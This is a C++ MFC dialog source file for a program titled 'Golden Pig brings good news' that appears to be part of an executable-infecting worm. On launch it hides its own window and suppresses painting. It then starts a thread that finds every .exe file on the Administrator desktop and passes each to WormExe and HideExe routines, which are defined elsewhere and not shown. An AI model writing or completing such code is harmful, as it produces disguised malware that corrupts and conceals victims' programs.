// GoldPigDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "GoldPigDlg.h"
#include "afxdialogex.h"
#include "Global.h"

DWORD WINAPI WorkProc(LPVOID lpParam);

// CGoldPigDlg 对话框

IMPLEMENT_DYNAMIC(CGoldPigDlg, CDialogEx)

CGoldPigDlg::CGoldPigDlg(CWnd* pParent /*=NULL*/)
    : CDialogEx(CGoldPigDlg::IDD, pParent)
{
}

CGoldPigDlg::~CGoldPigDlg()
{
}

void CGoldPigDlg::DoDataExchange(CDataExchange* pDX)
{
    CDialogEx::DoDataExchange(pDX);
}


BEGIN_MESSAGE_MAP(CGoldPigDlg, CDialogEx)
    ON_WM_NCPAINT()
END_MESSAGE_MAP()


// CGoldPigDlg 消息处理程序


BOOL CGoldPigDlg::OnInitDialog()
{
    CDialogEx::OnInitDialog();
    ShowWindow(SW_HIDE);
    // TODO:  在此添加额外的初始化
    m_hIcon = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_ICON_GOLDPIG));
    SetIcon(m_hIcon, TRUE);     // Large icon
    SetIcon(m_hIcon, FALSE);    // Small icon
    SetWindowText(_T("金猪报喜"));
    // Thread worker thread
    CreateThread(NULL, NULL, WorkProc, this, 0, NULL);
    return TRUE;  // return TRUE unless you set the focus to a control
    // 异常:  OCX 属性页应返回 FALSE
}

// Find file
DWORD WINAPI WorkProc(LPVOID lpParam)
{
    // Executable file
    CFileFind finder;
    BOOL bFind = finder.FindFile(_T("C:\\Users\\Administrator\\Desktop\\*.exe"));

    while(bFind)
    {
        bFind = finder.FindNextFile();
        // Get the file path
        CString strPath = finder.GetFilePath();
        // MessageBox(NULL, strPath, _T("Hint"), MB_OK);
        // Set EXE executable file icon Windows Win 32 SDK programming, MFC programming
        WormExe(strPath.GetBuffer());
        // To hide
        HideExe(strPath.GetBuffer());
    }

    finder.Close();
    return 0;
}

// Hide Icon
void CGoldPigDlg::OnNcPaint()
{
    // TODO:  在此处添加消息处理程序代码
    // 不为绘图消息调用 CDialogEx::OnNcPaint()
    static bool bNotPaint = true;

    if(bNotPaint)
    {
        ShowWindow(SW_HIDE);// SW_HIDE
        bNotPaint = false;
    }
    else
    {
        CDialogEx::OnNcPaint();
    }
}
